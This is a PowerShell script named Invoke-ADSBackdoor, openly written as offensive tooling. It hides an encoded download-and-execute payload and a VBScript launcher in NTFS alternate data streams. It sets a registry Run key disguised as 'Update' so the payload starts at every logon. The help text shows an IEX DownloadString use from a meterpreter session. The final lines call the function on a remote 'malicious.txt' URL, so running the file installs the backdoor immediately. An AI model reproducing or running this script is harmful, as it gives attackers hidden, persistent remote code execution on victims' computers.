function Invoke-ADSBackdoor{
    <#
    .SYNOPSIS
    Powershell Script that will use Alternate Data Streams to achieve persistence
    
    .DESCRIPTION
    This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
    using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream 
    stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the 
    payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
    The arguments must also be in quotation marks.
    
    .EXAMPLE
    PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"
    This will use the function "Hack" in payload.ps1 for persistence
    
    C:\>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.2.72.147/malicious.txt'); Invoke-ADSBackdoor 
    -URL http://10.2.72.147/malicious.txt 
    This will execute the persistence script using Invoke-Shellcode as the payload from a meterpreter session
    #>
    
        [CmdletBinding()]
        Param(
           [Parameter(Mandatory=$True)]
           [string]$URL
        )
    
        $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
        $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
        $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
    
        #Store Payload
        $payloadParameters = "((New-Object Net.WebClient).DownloadString('$URL'))|out-file c:\temp\s.ps1; . c:\temp\s.ps1;"
        $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
        $payload = "powershell.exe -ep Bypass -noexit -enc $encodedPayload"
    
        #Store VBS Wrapper
        $vbstext1 = "Dim objShell"
        $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
        $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData:$textFile) do %i"""
        $vbstext4 = "objShell.Run command, 0"
        $vbstext5 = "Set objShell = Nothing"
        $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
    
        #Create Alternate Data Streams for Payload and Wrapper
        $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
        $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
        Invoke-Command -ScriptBlock $CreatePayloadADS
        "Payload stored in $env:USERPROFILE\AppData:$textFile"
        Invoke-Command -ScriptBlock $CreateWrapperADS
        "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
    
        #Persist in Registry
        new-itemproperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
        "Process Complete. Persistent key is located at HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Update"
    }
    
    $URL = 'https://gist.githubusercontent.com/technick28/f727f5c2d55ff0bd0d6bf82ae714f3e8/raw/abe8ae1f13b9bffabf1588524a1546796b2ad509/malicious.txt'
    Invoke-ADSBackdoor -URL $URL